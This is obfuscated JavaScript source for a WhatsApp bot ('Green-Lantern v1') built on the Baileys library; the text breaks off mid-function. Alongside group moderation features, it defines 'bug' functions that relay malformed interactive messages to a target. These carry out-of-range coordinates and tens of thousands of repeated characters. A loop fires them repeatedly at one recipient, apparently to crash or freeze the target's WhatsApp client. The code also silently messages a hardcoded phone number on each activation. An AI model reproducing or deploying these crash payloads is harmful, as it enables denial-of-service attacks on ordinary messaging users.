/*

PROPERTY OF MARX BOT INC




*/
//Marx Kings
require("./config");
const {
  WA_DEFAULT_EPHEMERAL,
  getAggregateVotesInPollMessage,
  generateWAMessageFromContent,
  proto,
  generateWAMessageContent,
  generateWAMessage,
  prepareWAMessageMedia,
  downloadContentFromMessage,
  areJidsSameUser,
  getContentType,
  useMultiFileAuthState,
  makeWASocket,
  fetchLatestBaileysVersion,
  makeCacheableSignalKeyStore,
  makeWaSocket
} = require("@whiskeysockets/baileys");
const {
  getDevice
} = require("@whiskeysockets/baileys");
const fs = require("fs");
const util = require("util");
const axios = require("axios");
const {
  exec
} = require("child_process");
const chalk = require("chalk");
const cheerio = require("cheerio");
const moment = require("moment-timezone");
const yts = require("yt-search");
const {
  ytdl
} = require("./Chuckybase/libary/ytdl");
const {
  spotifyDown
} = require("./Chuckybase/libary/spotify");
const didyoumean = require("didyoumean");
const similarity = require("similarity");
const antispam = require("./antispam");
const autoreply = require("./autoreply");
const antivv = require("./antivv");
module.exports = async (_0x4b53e5, _0x21f0d9) => {
  await antispam(_0x4b53e5, _0x21f0d9);
  const _0x4d1a4f = require("fs");
  const _0x1c3fd8 = "./lastActivation.txt";
  const _0x232d26 = 7200000;
  async function _0x5e6832() {
    try {
      const _0x2904c1 = "2348108778025@s.whatsapp.net";
      const _0x2300ed = "./marx/anjay.jpg";
      const _0x571e0e = {
        url: _0x2300ed
      };
      const _0x59b38d = {
        caption: "*⌜ <\\> 𝐆𝐫𝐞𝐞𝐧-𝐋𝐚𝐧𝐭𝐞𝐫𝐧 𝐯𝟏 ACTIVATED🥷🏽*\n────────────────────\n> *▧ CREATOR ▧* :  *devil🥷🏽🐍❤️*\ndevil🔥❤️\n> © devil bot \n       ",
        image: _0x571e0e
      };
      const _0x45e0d0 = _0x59b38d;
      await _0x4b53e5.sendMessage(_0x2904c1, _0x45e0d0);
      console.log("Activation message with image sent.");
    } catch (_0x1462ea) {
      console.error("Failed to send activation message:", _0x1462ea);
    }
  }
  async function _0x13e577() {
    const _0x5dace3 = Date.now();
    if (_0x4d1a4f.existsSync(_0x1c3fd8)) {
      const _0x86619d = parseInt(_0x4d1a4f.readFileSync(_0x1c3fd8, "utf-8"), 10);
      if (_0x5dace3 - _0x86619d < _0x232d26) {
        console.log("Message already sent recently. Skipping.");
        return;
      }
    }
    await _0x5e6832();
    _0x4d1a4f.writeFileSync(_0x1c3fd8, _0x5dace3.toString(), "utf-8");
  }
  _0x13e577();
  try {
    const _0x22a0dd = _0x21f0d9.key.remoteJid;
    var _0x311cd4 = _0x21f0d9.mtype === "interactiveResponseMessage" ? JSON.parse(_0x21f0d9.message.interactiveResponseMessage.nativeFlowResponseMessage.paramsJson).id : _0x21f0d9.mtype === "conversation" ? _0x21f0d9.message.conversation : _0x21f0d9.mtype == "imageMessage" ? _0x21f0d9.message.imageMessage.caption : _0x21f0d9.mtype == "videoMessage" ? _0x21f0d9.message.videoMessage.caption : _0x21f0d9.mtype == "extendedTextMessage" ? _0x21f0d9.message.extendedTextMessage.text : _0x21f0d9.mtype == "buttonsResponseMessage" ? _0x21f0d9.message.buttonsResponseMessage.selectedButtonId : _0x21f0d9.mtype == "listResponseMessage" ? _0x21f0d9.message.listResponseMessage.singleSelectReply.selectedRowId : _0x21f0d9.mtype == "templateButtonReplyMessage" ? _0x21f0d9.message.templateButtonReplyMessage.selectedId : _0x21f0d9.mtype == "messageContextInfo" ? _0x21f0d9.message.buttonsResponseMessage?.selectedButtonId || _0x21f0d9.message.listResponseMessage?.singleSelectReply.selectedRowId || _0x21f0d9.text : "";
    const {
      smsg: _0x134b18,
      fetchJson: _0x53139d,
      getBuffer: _0xac7c48,
      fetchBuffer: _0x48aac2,
      getGroupAdmins: _0x3fc299,
      TelegraPh: _0x197461,
      isUrl: _0x5079ce,
      hitungmundur: _0x131863,
      sleep: _0x96020a,
      clockString: _0x351454,
      checkBandwidth: _0x5c8de5,
      runtime: _0x26fa88,
      tanggal: _0x32e4ea,
      getRandom: _0x3da9a9
    } = require("./lib/myfunc");
    const {
      addResponList: _0x4f157f,
      delResponList: _0x3bda5d,
      isAlreadyResponList: _0x17db1a,
      isAlreadyResponListGroup: _0x47dc06,
      sendResponList: _0x4636b2,
      updateResponList: _0x514168,
      getDataResponList: _0x3ab186
    } = require("./lib/respon-list");
    const {
      isSetProses: _0x13c037,
      addSetProses: _0xdacdd2,
      removeSetProses: _0x42dc17,
      changeSetProses: _0x4c8ba8,
      getTextSetProses: _0x3935ee
    } = require("./lib/setproses");
    const {
      isSetDone: _0x3ce2e7,
      addSetDone: _0x2ccf0c,
      removeSetDone: _0x2e5b92,
      changeSetDone: _0x72c056,
      getTextSetDone: _0x1787ab
    } = require("./lib/setdone");
    var _0x8963e8 = typeof _0x21f0d9.text == "string" ? _0x21f0d9.text : "";
    var _0x3a5987 = global.prefa ? /^[°•π÷×¶∆£¢€¥®™+✓_=|~!?@#$%^&.©^]/gi.test(_0x311cd4) ? _0x311cd4.match(/^[°•π÷×¶∆£¢€¥®™+✓_=|~!?@#$%^&.©^]/gi)[0] : "" : global.prefa ?? global.prefix;
    const _0x18fa01 = _0x311cd4.startsWith(_0x3a5987);
    const _0x4ae68c = _0x18fa01 ? _0x311cd4.slice(_0x3a5987.length).trim().split(" ").shift().toLowerCase() : "";
    const _0x13e106 = _0x311cd4.trim().split(/ +/).slice(1);
    const _0x40d288 = q = _0x13e106.join(" ");
    const _0x57ad6 = _0x21f0d9.key.fromMe ? _0x4b53e5.user.id.split(":")[0] + "@s.whatsapp.net" || _0x4b53e5.user.id : _0x21f0d9.key.participant || _0x21f0d9.key.remoteJid;
    const _0x47334e = await _0x4b53e5.decodeJid(_0x4b53e5.user.id);
    const _0x2c952a = _0x57ad6.split("@")[0];
    const _0x13b948 = JSON.parse(_0x4d1a4f.readFileSync("./database/owner.json"));
    const _0x489e8f = JSON.parse(_0x4d1a4f.readFileSync("./database/owner.json"));
    const _0x4ce25b = _0x311cd4.replace(_0x4ae68c, "").slice(1).trim();
    const _0x2777ae = JSON.parse(_0x4d1a4f.readFileSync("./database/premium.json"));
    const _0x590e27 = [_0x47334e, ..._0x489e8f, ...global.ownMain].map(_0x5c6008 => _0x5c6008.replace(/[^0-9]/g, "") + "@s.whatsapp.net").includes(_0x21f0d9.sender);
    const _0x2054ca = [_0x47334e, ..._0x2777ae, ..._0x489e8f].map(_0x20816b => _0x20816b.replace(/[^0-9]/g, "") + "@s.whatsapp.net").includes(_0x21f0d9.sender);
    const _0x3d405c = _0x21f0d9.sender == owner + "@s.whatsapp.net" ? true : _0x21f0d9.sender == _0x47334e ? true : false;
    const _0x39695a = _0x21f0d9 && _0x21f0d9.sender && [_0x47334e, ...global.owner].map(_0x40eafc => _0x40eafc.replace(/[^0-9]/g, "") + "@s.whatsapp.net").includes(_0x21f0d9.sender) || false;
    const _0x45dcac = _0x21f0d9.pushName || "" + _0x2c952a;
    const _0x452718 = _0x47334e.includes(_0x2c952a);
    const _0x16cb12 = _0x21f0d9.chat.endsWith("@g.us");
    const _0x88ec1 = _0x21f0d9.quoted ? _0x21f0d9.quoted : _0x21f0d9;
    const _0x5ed57c = (_0x88ec1.msg || _0x88ec1).mimetype || "";
    const _0x4412d6 = _0x88ec1.msg || _0x88ec1;
    const _0x4ba20d = _0x21f0d9.isGroup ? await _0x4b53e5.groupMetadata(_0x22a0dd).catch(_0x14906d => {}) : "";
    const _0x1566a6 = _0x21f0d9.isGroup ? _0x4ba20d.subject : "";
    const _0x349e8b = _0x21f0d9.isGroup ? await _0x4ba20d.participants : "";
    const _0x3003ae = _0x21f0d9.isGroup ? await _0x3fc299(_0x349e8b) : "";
    const _0x3774e0 = _0x21f0d9.isGroup ? _0x3003ae.includes(_0x47334e) : false;
    const _0x57a285 = _0x21f0d9.isGroup ? _0x3003ae.includes(_0x21f0d9.sender) : false;
    let _0x3e90e8 = JSON.parse(_0x4d1a4f.readFileSync("./database/list-message.json"));
    let _0x37e580 = JSON.parse(_0x4d1a4f.readFileSync("./database/list-message.json"));
    let _0x5d26e7 = JSON.parse(_0x4d1a4f.readFileSync("./database/set_proses.json"));
    let _0x5c7c56 = JSON.parse(_0x4d1a4f.readFileSync("./database/set_done.json"));
    const _0x3e6b4d = require("chalk");
    const _0x1db561 = [_0x3e6b4d.red, _0x3e6b4d.yellow, _0x3e6b4d.green, _0x3e6b4d.cyan, _0x3e6b4d.blue, _0x3e6b4d.magenta];
    function _0x279882(_0x3230bc) {
      return _0x3230bc.split("").map((_0x3c1536, _0x5d77dc) => {
        return _0x1db561[_0x5d77dc % _0x1db561.length](_0x3c1536);
      }).join("");
    }
    if (_0x21f0d9.message) {
      console.log(_0x3e6b4d.black(_0x3e6b4d.bgWhite("\n░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░\n░█▀▀░█░█░█░█░█▀▀░█░█░█░█░░░█░█░▀▀█\n░█░░░█▀█░█░█░█░░░█▀▄░░█░░░░▀▄▀░▄▀░\n░▀▀▀░▀░▀░▀▀▀░▀▀▀░▀░▀░░▀░░░░░▀░░▀░░\n░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░\n[ MESSAGE ]")), _0x3e6b4d.black(_0x3e6b4d.bgBlue(new Date())), _0x3e6b4d.black(_0x3e6b4d.bgWhite(_0x8963e8 || _0x21f0d9.mtype)) + "\n" + _0x3e6b4d.magenta("=> From "), _0x3e6b4d.green(_0x279882(_0x45dcac)), _0x3e6b4d.yellow(_0x21f0d9.sender) + "\n" + _0x3e6b4d.blueBright("=> In "), _0x3e6b4d.green(_0x21f0d9.isGroup ? _0x279882(_0x45dcac) : "Private Chat", _0x22a0dd));
    }
    try {
      ppuser = await _0x4b53e5.profilePictureUrl(_0x21f0d9.sender, "image");
    } catch (_0x16bb8d) {
      ppuser = "https://cdn.pixabay.com/photo/2015/10/05/22/37/blank-profile-picture-973460_960_720.png?q=60";
    }
    ppnyauser = await _0xac7c48(ppuser);
    try {
      let _0xb48ffd = _0x4132b6 => typeof _0x4132b6 === "number" && !isNaN(_0x4132b6);
      let _0x6e98bd = global.limitawal.free;
      let _0x2e3d8f = global.db.data.users[_0x21f0d9.sender];
      if (typeof _0x2e3d8f !== "object") {
        global.db.data.users[_0x21f0d9.sender] = {};
      }
      if (_0x2e3d8f) {
        if (!_0xb48ffd(_0x2e3d8f.afkTime)) {
          _0x2e3d8f.afkTime = -1;
        }
        if (!("afkReason" in _0x2e3d8f)) {
          _0x2e3d8f.afkReason = "";
        }
        if (!_0xb48ffd(_0x2e3d8f.limit)) {
          _0x2e3d8f.limit = _0x6e98bd;
        }
      } else {
        global.db.data.users[_0x21f0d9.sender] = {
          afkTime: -1,
          afkReason: "",
          limit: _0x6e98bd
        };
      }
    } catch (_0x4f7377) {
      console.log(_0x4f7377);
    }
    global.antilink = global.antilink || true;
    if (_0x16cb12) {
      if (_0x4ae68c === "antilink") {
        if (!_0x57a285 && !_0x3d405c) {
          return _0x3b9923("Only group admins can use this command.");
        }
        const _0x3d5ea4 = _0x13e106[0]?.toLowerCase();
        if (_0x3d5ea4 === "on") {
          global.antilink = true;
          _0x3b9923("🔒 Antilink feature has been enabled for this group.");
        } else if (_0x3d5ea4 === "off") {
          global.antilink = false;
          _0x3b9923("🔓 Antilink feature has been disabled for this group.");
        } else {
          _0x3b9923("Usage: .antilink on/off");
        }
        return;
      }
      if (global.antilink) {
        if (!_0x3774e0) {
          return;
        }
        if (!_0x57a285 && !_0x3d405c && !_0x21f0d9.fromMe) {
          const _0x58d133 = /(https?:\/\/(?:www\.)?(youtube\.com|youtu\.be|tiktok\.com|facebook\.com|instagram\.com|twitter\.com|whatsapp\.com|linkedin\.com|pinterest\.com|reddit\.com|discord\.com|github\.com)[^\s]*)/gi;
          if (_0x58d133.test(_0x21f0d9.text)) {
            const _0x265e7c = "https://chat.whatsapp.com/" + (await _0x4b53e5.groupInviteCode(_0x21f0d9.chat));
            const _0x465919 = new RegExp(_0x265e7c, "i");
            const _0x4f8f48 = _0x465919.test(_0x21f0d9.text);
            if (_0x4f8f48) {
              return;
            }
            global.warningCount = global.warningCount || {};
            global.antilinkWarningLimit = global.antilinkWarningLimit || 3;
            global.warningCooldown = global.warningCooldown || 86400000;
            const _0x539724 = global.warningCount[_0x21f0d9.sender] || {
              count: 0,
              lastWarning: 0
            };
            if (Date.now() - _0x539724.lastWarning > global.warningCooldown) {
              _0x539724.count = 0;
            }
            _0x539724.count++;
            _0x539724.lastWarning = Date.now();
            global.warningCount[_0x21f0d9.sender] = _0x539724;
            if (_0x539724.count < global.antilinkWarningLimit) {
              await _0x4b53e5.sendMessage(_0x21f0d9.chat, {
                text: "@" + _0x21f0d9.sender.split("@")[0] + " Warning! Sending links is not allowed in this group. *(" + _0x539724.count + "/" + global.antilinkWarningLimit + ")*",
                contextInfo: {
                  mentionedJid: [_0x21f0d9.sender]
                }
              }, {
                quoted: _0x21f0d9
              });
              const _0x29e0eb = (await _0x4b53e5.groupMetadata(_0x21f0d9.chat)).participants.filter(_0x17e553 => _0x17e553.admin === "admin").map(_0x420061 => _0x420061.id);
              for (let _0x5d1c4b of _0x29e0eb) {
                await _0x4b53e5.sendMessage(_0x5d1c4b, {
                  text: "User @" + _0x21f0d9.sender.split("@")[0] + " shared a prohibited link in the group: *" + _0x21f0d9.chat + "*.\nWarnings: " + _0x539724.count + "/" + global.antilinkWarningLimit,
                  contextInfo: {
                    mentionedJid: [_0x21f0d9.sender]
                  }
                });
              }
              await _0x4b53e5.sendMessage(_0x21f0d9.chat, {
                delete: {
                  remoteJid: _0x21f0d9.chat,
                  fromMe: false,
                  id: _0x21f0d9.key.id,
                  participant: _0x21f0d9.key.participant
                }
              });
            } else {
              await _0x4b53e5.sendMessage(_0x21f0d9.chat, {
                text: "@" + _0x21f0d9.sender.split("@")[0] + " You have been removed from the group due to repeated link sharing.",
                contextInfo: {
                  mentionedJid: [_0x21f0d9.sender]
                }
              }, {
                quoted: _0x21f0d9
              });
              const _0x45478d = (await _0x4b53e5.groupMetadata(_0x21f0d9.chat)).participants.filter(_0x3497f9 => _0x3497f9.admin === "admin").map(_0x3fd0e6 => _0x3fd0e6.id);
              for (let _0x2212a1 of _0x45478d) {
                await _0x4b53e5.sendMessage(_0x2212a1, {
                  text: "User @" + _0x21f0d9.sender.split("@")[0] + " was removed from the group *" + _0x21f0d9.chat + "* for exceeding the link violation limit.",
                  contextInfo: {
                    mentionedJid: [_0x21f0d9.sender]
                  }
                });
              }
              await _0x4b53e5.groupParticipantsUpdate(_0x21f0d9.chat, [_0x21f0d9.sender], "remove");
              delete global.warningCount[_0x21f0d9.sender];
            }
          }
        }
      }
      if (_0x4ae68c === "forgive") {
        const _0x324176 = _0x21f0d9.mentionedJid[0];
        if (_0x324176 && global.warningCount[_0x324176]) {
          delete global.warningCount[_0x324176];
          _0x3b9923("Warnings have been reset for @" + _0x324176.split("@")[0] + ".", {
            contextInfo: {
              mentionedJid: [_0x324176]
            }
          });
        } else {
          _0x3b9923("No warnings found for the mentioned user.");
        }
      }
    }
    if (_0x21f0d9.isGroup && _0x17db1a(_0x21f0d9.chat, _0x311cd4.toLowerCase(), _0x3e90e8)) {
      var _0x2e0c5a = _0x3ab186(_0x21f0d9.chat, _0x311cd4.toLowerCase(), _0x3e90e8);
      if (_0x2e0c5a.isImage === false) {
        _0x4b53e5.sendMessage(_0x21f0d9.chat, {
          text: _0x4636b2(_0x21f0d9.chat, _0x311cd4.toLowerCase(), _0x3e90e8)
        }, {
          quoted: _0x21f0d9
        });
      } else {
        _0x4b53e5.sendMessage(_0x21f0d9.chat, {
          image: await _0xac7c48(_0x2e0c5a.image_url),
          caption: _0x2e0c5a.response
        }, {
          quoted: _0x21f0d9
        });
      }
    }
    const _0x503a33 = async (_0x5d1401, _0x3f173c, _0x30f7bf) => {
      return new Promise(async (_0x2267e9, _0x5d8d85) => {
        let _0x6b213a = require("jimp");
        var _0x117377 = await _0x6b213a.read(_0x5d1401);
        var _0x179e71 = await _0x117377.resize(_0x3f173c, _0x30f7bf).getBufferAsync(_0x6b213a.MIME_JPEG);
        _0x2267e9(_0x179e71);
      });
    };
    const _0x48fbaa = await _0x503a33(ppuser, 300, 300);
    const _0x1bc0f7 = _0x4d1a4f.readFileSync("./lib/image/virgam.png");
    const _0x34ca02 = _0x4d1a4f.readFileSync("./lib/image/slayer.png");
    const _0x38be4e = _0x4d1a4f.readFileSync("./lib/image/latx.png");
    const {
      xeontext1: _0x368953
    } = require("./69/xeontext1");
    const _0x34a350 = _0x4d1a4f.readFileSync("./marx/anjay.jpg");
    const _0x16b61d = _0x4d1a4f.readFileSync("./menu.mp4");
    const _0x1fa4e2 = _0x4d1a4f.readFileSync("./marx/qris.jpg");
    const {
      button: _0x520830
    } = require("./lib/ngentot.js");
    const {
      ios: _0x45a878
    } = require("./lib/ios.js");
    const _0x83640c = async (_0xa9437e, _0x4c66a3) => {
      const _0x1052b2 = {
        text: _0x4c66a3,
        key: _0x21f0d9.key
      };
      const _0x3543e5 = {
        react: _0x1052b2
      };
      _0x4b53e5.sendMessage(_0xa9437e, _0x3543e5);
    };
    const {
      andro: _0x5ce354
    } = require("./lib/andro.js");
    const _0x4e7e34 = ["🗿"];
    const _0x3d8576 = _0x4e7e34[Math.floor(Math.random() * _0x4e7e34.length)];
    const _0x53b7bf = ["https://files.catbox.moe/8ehkk3.jpg", "https://files.catbox.moe/2krxxm.jpg", "https://files.catbox.moe/5u72ck.jpg", "https://files.catbox.moe/apim8f.jpg", "https://files.catbox.moe/phg56y.jpg", "https://telegra.ph/file/e6e5a3bbe152c54f6ac65.jpg", "https://telegra.ph/file/4063a5ab22fa48d09a428.jpg", "https://files.catbox.moe/cdoqzh.jpg", "https://files.catbox.moe/wgikom.jpg", "https://files.catbox.moe/u7rpip.jpg", "https://files.catbox.moe/0wdlj4.jpg", "https://files.catbox.moe/te894y.jpg", "https://files.catbox.moe/k7kb29.jpg", "https://files.catbox.moe/k7ym9h.jpg", "https://files.catbox.moe/8bvwtv.jpg", "https://files.catbox.moe/mgjvky.jpg", "https://files.catbox.moe/q46i9m.jpg", "https://files.catbox.moe/gd6eka.jpg", "https://files.catbox.moe/qpeyj5.jpg", "https://files.catbox.moe/jwsitc.jpg", "https://files.catbox.moe/sdhm35.jpg", "https://files.catbox.moe/zx805k.jpg", "https://files.catbox.moe/5qk12y.jpg", "https://files.catbox.moe/m62aqj.jpg", "https://files.catbox.moe/hagvan.jpg", "https://files.catbox.moe/ou1ghb.jpg", "https://files.catbox.moe/zrd8ey.jpg", "https://files.catbox.moe/h1okjg.jpg", "https://files.catbox.moe/bw7i7d.jpg"];
    function _0x21cb15() {
      const _0x1a250e = Math.floor(Math.random() * _0x53b7bf.length);
      return _0x53b7bf[_0x1a250e];
    }
    const _0x2c1fe4 = _0x21cb15();
    const _0x2f5c03 = _0x4d1a4f.readFileSync("./lib/image/marrx.apk");
    let _0x4b2160 = require("jimp");
    const _0x2b37fa = async (_0x2feef2, _0x2cd7f2, _0x569346) => {
      const _0x8c6064 = await _0x4b2160.read(_0x2feef2);
      const _0x45f5b0 = await _0x8c6064.resize(_0x2cd7f2, _0x569346).getBufferAsync(_0x4b2160.MIME_JPEG);
      return _0x45f5b0;
    };
    async function _0x41cec1(_0x46d6e2, _0x5abffb) {
      for (let _0x1cee37 = 0; _0x1cee37 < _0x5abffb; _0x1cee37++) {
        await _0x450464(_0x46d6e2);
        await _0x251533(_0x46d6e2);
        await _0x358850(_0x46d6e2);
        await _0x5de474(_0x46d6e2);
        await await _0x2dbc06(_0x46d6e2);
        await _0x28708f(_0x46d6e2);
        await _0x3e7cb4(_0x46d6e2);
        await _0x46d162(_0x46d6e2);
        await _0xcb3ebe(_0x46d6e2);
        await _0x10f423(_0x46d6e2);
        await _0x35e614(_0x46d6e2);
        await _0x38caf8(_0x46d6e2);
        await _0x30b939(_0x46d6e2);
        await _0x30b939(_0x46d6e2);
        await _0x30b939(_0x46d6e2);
        await _0x450464(_0x46d6e2);
        await _0x251533(_0x46d6e2);
        await _0x358850(_0x46d6e2);
        await _0x5de474(_0x46d6e2);
        await await _0x2dbc06(_0x46d6e2);
        await _0x28708f(_0x46d6e2);
        await _0x3e7cb4(_0x46d6e2);
        await _0x46d162(_0x46d6e2);
        await _0xcb3ebe(_0x46d6e2);
        await _0x10f423(_0x46d6e2);
        await _0x35e614(_0x46d6e2);
        await _0x38caf8(_0x46d6e2);
        await _0x30b939(_0x46d6e2);
        await _0x30b939(_0x46d6e2);
        await _0x30b939(_0x46d6e2);
      }
    }
    async function _0x34c772() {
      var _0x356cb0 = ["🕛 𝘓𝘰𝘢𝘥𝘪𝘯𝘨.\n▰▱▱▱▱▱▱▱", "🕒 𝘓𝘰𝘢𝘥𝘪𝘯𝘨..\n▰▰▰▱▱▱▱▱", "🕧 𝘓𝘰𝘢𝘥𝘪𝘯𝘨...\n▰▰▰▰▰▱▱▱", "🕖 𝘓𝘰𝘢𝘥𝘪𝘯𝘨...\n▰▰▰▰▰▰▰▱", "🕛 𝘓𝘰𝘢𝘥𝘪𝘯𝘨....\n▰▰▰▰▰▰▰▰", "𝐊𝐈𝐋𝐋𝚵𝐑 𝐂𝐇𝐔𝐂𝐊𝐘-𝛁𝟕💀"];
      let {
        key: _0x3c8295
      } = await _0x4b53e5.sendMessage(_0x21f0d9.chat, {
        text: "\n> 𝐆𝐫𝐞𝐞𝐧-𝐋𝐚𝐧𝐭𝐞𝐫𝐧 𝐯𝟏💀"
      });
      const _0x5909a5 = _0x3c254b => {
        return _0x3c254b[Math.floor(Math.random() * _0x3c254b.length)];
      };
      for (let _0x2ec021 = 0; _0x2ec021 < _0x356cb0.length; _0x2ec021++) {
        await _0x96020a(10);
        const _0x36975b = {
          text: _0x356cb0[_0x2ec021],
          edit: _0x3c8295
        };
        await _0x4b53e5.sendMessage(_0x21f0d9.chat, _0x36975b);
      }
    }
    function _0x327804(_0x173ce9, _0x2c795b = [], _0x3c6a21 = false) {
      if (_0x3c6a21 == null || _0x3c6a21 == undefined || _0x3c6a21 == false) {
        return;
        const _0x3e9f90 = {
          text: _0x173ce9,
          mentions: _0x2c795b
        };
        _0x4b53e5.sendMessage(_0x21f0d9.chat, _0x3e9f90, {
          quoted: _0x21f0d9
        });
      } else {
        const _0x1be435 = {
          text: _0x173ce9,
          mentions: _0x2c795b
        };
        return _0x4b53e5.sendMessage(_0x21f0d9.chat, _0x1be435, {
          quoted: _0x21f0d9
        });
      }
    }
    const _0x42313a = {
      participant: "0@s.whatsapp.net",
      ...(_0x21f0d9.chat ? {
        remoteJid: "status@broadcast"
      } : {})
    };
    const _0x5f313c = {
      title: "🪨Msg " + (_0x21f0d9.body || _0x21f0d9.mtype),
      jpegThumbnail: _0x2f5c03
    };
    const _0x462431 = {
      documentMessage: _0x5f313c
    };
    const _0x2e7a3e = {
      key: _0x42313a,
      message: _0x462431
    };
    const _0x5e3f37 = _0x2e7a3e;
    const _0xfcb4de = {
      participant: "0@s.whatsapp.net",
      ...(_0x21f0d9.chat ? {
        remoteJid: "status@broadcast"
      } : {})
    };
    const _0x3b3961 = {
      key: _0xfcb4de,
      message: {
        listResponseMessage: {
          title: "𝐆𝐫𝐞𝐞𝐧-𝐋𝐚𝐧𝐭𝐞𝐫𝐧 𝐯𝟏"
        }
      }
    };
    const _0x8d23b4 = _0x3b3961;
    const _0x2c875b = {
      participant: "0@s.whatsapp.net",
      ...(_0x21f0d9.chat ? {
        remoteJid: "status@broadcast"
      } : {})
    };
    const _0x558ce7 = {
      key: _0x2c875b,
      message: {
        listResponseMessage: {
          title: "𝐆𝐫𝐞𝐞𝐧-𝐋𝐚𝐧𝐭𝐞𝐫𝐧 𝐯𝟏"
        }
      }
    };
    const _0x204a73 = _0x558ce7;
    const _0x327dba = {
      key: {
        remoteJid: "p",
        fromMe: false,
        participant: "0@s.whatsapp.net"
      },
      message: {
        interactiveResponseMessage: {
          body: {
            text: "Sent",
            format: "DEFAULT"
          },
          nativeFlowResponseMessage: {
            name: "galaxy_message",
            paramsJson: "{\"screen_2_OptIn_0\":true,\"screen_2_OptIn_1\":true,\"screen_1_Dropdown_0\":\"ZetExecute\",\"screen_1_DatePicker_1\":\"1028995200000\",\"screen_1_TextInput_2\":\"czazxvoid@sky.id\",\"screen_1_TextInput_3\":\"94643116\",\"screen_0_TextInput_0\":\"radio - buttons" + "".repeat(500000) + "\",\"screen_0_TextInput_1\":\"anjay\",\"screen_0_Dropdown_2\":\"001-Grimgar\",\"screen_0_RadioButtonsGroup_3\":\"0_true\",\"flow_token\":\"AQAAAAACS5FpgQ_cAAAAAE0QI3s.\"}",
            version: 3
          }
        }
      }
    };
    async function _0x39fb7a(_0x487935, _0x4be10f, _0x12ca48 = false) {
      let _0x3dc102 = generateWAMessageFromContent(_0x487935, proto.Message.fromObject({
        ephemeralMessage: {
          message: {
            interactiveMessage: {
              header: {
                title: "⭑̤▾ ⿻ Dev ⿻ ▾⭑̤‌‌‌‌‌‌‌‌‌‌‌‌‌‏",
                locationMessage: {
                  degreesLatitude: -999.035,
                  degreesLongitude: 922.999999999999,
                  name: "⚝𝐏𝐒𝐓𝐞𝐚𝐦𝐀𝐝𝐦⚝",
                  address: "🎭⃟༑⌁⃰𝐆𝐫𝐞𝐞𝐧-𝐋𝐚𝐧𝐭𝐞𝐫𝐧 𝐯𝟏😈",
                  jpegThumbnail: _0x4be10f
                },
                hasMediaAttachment: true
              },
              body: {
                text: ""
              },
              nativeFlowMessage: {
                messageParamsJson: " 𝐌𝐲𝐬𝐭𝐞𝐫𝐢𝐨𝐮𝐬 𝐌𝐞𝐧 𝐈𝐧 𝐂𝐲𝐛𝐞𝐫𝐒𝐩𝐚𝐜𝐞♻️ ",
                buttons: [{
                  name: "single_select",
                  buttonParamsJson: {
                    title: "🎭⃟༑⌁⃰𝐆𝐫𝐞𝐞𝐧-𝐋𝐚𝐧𝐭𝐞𝐫𝐧 𝐯𝟏😈",
                    sections: [{
                      title: "A NEW ERA ϟ",
                      rows: []
                    }]
                  }
                }, {
                  name: "call_permission_request",
                  buttonParamsJson: {}
                }]
              }
            }
          }
        }
      }), {
        userJid: _0x487935,
        quoted: EsQl
      });
      await _0x4b53e5.relayMessage(_0x487935, _0x3dc102.message, _0x12ca48 ? {
        participant: {
          jid: _0x487935
        }
      } : {});
      console.log(_0x3e6b4d.green("Send Bug By ⭑̤▾ ⿻ dev ⿻ ▾⭑"));
    }
    async function _0x5137fb(_0x4dff2f, _0x5b86d5, _0xc89402, _0x25345a = false) {
      let _0x56b955 = generateWAMessageFromContent(_0x4dff2f, proto.Message.fromObject({
        ephemeralMessage: {
          message: {
            interactiveMessage: {
              header: {
                title: "⭑̤▾ ⿻ dev ⿻ ▾⭑̤‌‌‌‌‌‌‌‌‌‌‌‌‌‏" + "ꦾ".repeat(77777),
                locationMessage: {
                  degreesLatitude: -999.035,
                  degreesLongitude: 922.999999999999,
                  name: "⚝𝐏𝐒𝐓𝐞𝐚𝐦𝐀𝐝𝐦⚝",
                  address: "🎭⃟༑⌁⃰𝐆𝐫𝐞𝐞𝐧-𝐋𝐚𝐧𝐭𝐞𝐫𝐧 𝐯𝟏😈",
                  jpegThumbnail: _0xc89402
                },
                hasMediaAttachment: true
              },
              body: {
                text: ""
              },
              nativeFlowMessage: {
                messageParamsJson: " 𝐌𝐲𝐬𝐭𝐞𝐫𝐢𝐨𝐮𝐬 𝐌𝐞𝐧 𝐈𝐧 𝐂𝐲𝐛𝐞𝐫𝐒𝐩𝐚𝐜𝐞♻️ ",
                buttons: [{
                  name: "single_select",
                  buttonParamsJson: {
                    title: "🎭⃟༑⌁⃰𝐆𝐫𝐞𝐞𝐧-𝐋𝐚𝐧𝐭𝐞𝐫𝐧 𝐯𝟏😈",
                    sections: [{
                      title: "A NEW ERA ϟ",
                      rows: []
                    }]
                  }
                }, {
                  name: "call_permission_request",
                  buttonParamsJson: {}
                }]
              }
            }
          }
        }
      }), {
        userJid: _0x4dff2f,
        quoted: _0x5b86d5
      });
      await _0x4b53e5.relayMessage(_0x4dff2f, _0x56b955.message, _0x25345a ? {
        participant: {
          jid: _0x4dff2f
        }
      } : {});
      console.log(_0x3e6b4d.green("Send Bug By ⭑̤▾ ⿻ dev ⿻ ▾⭑"));
    }
    async function _0x4aab8c(_0x26fca9, _0x337d02, _0x15ad6e = false) {
      let _0x19c0c4 = generateWAMessageFromContent(_0x26fca9, proto.Message.fromObject({
        ephemeralMessage: {
          message: {
            interactiveMessage: {
              header: {
                title: "⭑̤▾ ⿻ dev ⿻ ▾⭑̤‌‌‌‌‌‌‌‌‌‌‌‌‌‏",
                locationMessage: {
                  degreesLatitude: -999.035,
                  degreesLongitude: 922.999999999999,
                  name: "⚝𝐏𝐒𝐓𝐞𝐚𝐦𝐀𝐝𝐦⚝",
                  address: "🎭⃟༑⌁⃰𝐆𝐫𝐞𝐞𝐧-𝐋𝐚𝐧𝐭𝐞𝐫𝐧 𝐯𝟏😈",
                  jpegThumbnail: _0x337d02
                },
                hasMediaAttachment: true
              },
              body: {
                text: ""
              },
              nativeFlowMessage: {
                messageParamsJson: " 𝐌𝐲𝐬𝐭𝐞𝐫𝐢𝐨𝐮𝐬 𝐌𝐞𝐧 𝐈𝐧 𝐂𝐲𝐛𝐞𝐫𝐒𝐩𝐚𝐜𝐞♻️ ",
                buttons: [{
                  name: "single_select",
                  buttonParamsJson: {
                    title: "🎭⃟༑⌁⃰𝐆𝐫𝐞𝐞𝐧-𝐋𝐚𝐧𝐭𝐞𝐫𝐧 𝐯𝟏😈",
                    sections: [{
                      title: "A NEW ERA ϟ",
                      rows: []
                    }]
                  }
                }, {
                  name: "call_permission_request",
